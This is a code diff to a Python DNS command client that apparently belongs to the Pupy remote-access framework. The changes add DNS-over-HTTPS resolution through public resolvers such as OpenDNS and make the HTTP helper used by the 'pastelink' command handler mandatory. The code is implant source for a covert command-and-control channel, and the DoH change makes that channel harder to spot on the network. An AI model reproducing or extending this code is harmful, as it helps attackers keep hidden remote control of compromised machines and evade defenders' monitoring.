@@ -47,10 +47,10 @@ from picocmd import (
 
 CLIENT_VERSION = 2
 
-try:
-    from network.lib import tinyhttp
-except ImportError:
-    tinyhttp = None
+from network.lib import tinyhttp
+from network.lib import online
+from network.lib import doh as securedns
+
 
 class ProxyInfo(object):
     __slots__ = (
@@ -83,7 +83,9 @@ class ProxyInfo(object):
             self.scheme.lower(), auth, self.ip, self.port)
 
 class DnsCommandsClient(Thread):
-    def __init__(self, domain, key, ns=None, qtype=None, ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
+    def __init__(
+            self, domain, key, doh=False, ns=None, qtype=None,
+            ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
         try:
             import pupy
             self.pupy = pupy
@@ -93,15 +95,16 @@ class DnsCommandsClient(Thread):
             self.pupy = None
             self.cid = 31337
 
-        self.iid = os.getpid() % 65535
+        self.doh = doh
+        self.iid = os.getpid() & 0xFFFF
         self.qtype = qtype
         self._default_qtype = qtype
 
-        if (ns or self.qtype not in (None, 'A', 'AAAA')) and dnslib:
-            if not ns:
+        if (ns or self.doh or self.qtype not in (None, 'A', 'AAAA')) and (dnslib or self.doh):
+            if not ns and not self.doh:
                 raise ValueError('NS must be specified')
 
-            if not type(ns) in (list, tuple):
+            if not self.doh and not type(ns) in (list, tuple):
                 ns = ns.split(':')
                 if len(ns) == 1:
                     ns = (ns[0], 53)
@@ -115,7 +118,21 @@ class DnsCommandsClient(Thread):
             self.ns_socket = None
             self.ns_timeout = ns_timeout
             self.ns_socket_lock = Lock()
-            self.resolve = self._dnslib_resolve
+
+            if self.doh:
+                if not ns:
+                    self.ns = securedns.SecureDNS.available(
+                        'opendns.org', False, online.KNOWN_DNS['opendns.org']
+                    )
+
+                    if self.ns == None:
+                        raise ValueError('All known DoH servers are not working')
+                else:
+                    self.ns = securedns.SecureDNS(self.ns)
+
+                self.resolve = self._doh_resolve
+            else:
+                self.resolve = self._dnslib_resolve
         else:
             if ns:
                 logging.error('dnslib not available, use system resolver')
@@ -191,6 +208,13 @@ class DnsCommandsClient(Thread):
                 hostname, 80, family
             ) if af_family == family
         )
+
+    def _doh_resolve(self, hostname):
+        qtype = securedns.AAAA
+        if self.qtype == 'A':
+            qtype = securedns.A
+
+        return self.ns.resolve(hostname, qtype)
 
     def _dnslib_resolve(self, hostname):
         if self.qtype is None:
@@ -430,10 +454,6 @@ class DnsCommandsClient(Thread):
         return []
 
     def on_pastelink(self, url, action, encoder):
-        if not tinyhttp:
-            logging.error('TinyHTTP is not available')
-            return
-
         proxy = self.proxy
         if type(self.proxy) in (list, tuple):
             if len(self.proxy) > 0:
